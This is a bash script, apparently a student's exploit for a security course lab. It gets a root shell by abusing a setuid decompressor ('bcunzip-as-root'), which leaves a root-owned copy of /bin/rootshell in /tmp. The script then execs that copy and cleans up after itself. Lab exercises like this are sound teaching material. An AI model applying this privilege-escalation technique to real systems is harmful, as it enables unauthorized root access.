#!/bin/bash

#set environment variable BCZIP_MODE to -1
export BCZIP_MODE=-1
#copy contents of /bin/rootshell into a file named test2.sh
cat /bin/rootshell > test2.sh
#compress this file
bczip c test2.sh.bcz test2.sh
#decompress this file
bcunzip-as-root test2.sh.bcz
#find the copy of the file created in /tmp/ during decompression
find /tmp/ -name test2.sh > test2location.txt
#execute this file (exec's all test2.sh's because I wasn't sure the test machine would be clean from other students tests)
cat test2location.txt | while read loc
do
exec $loc
done

#delete files
rm -f test2.sh
rm -f test2.sh.bcz
rm -f test2location.txt
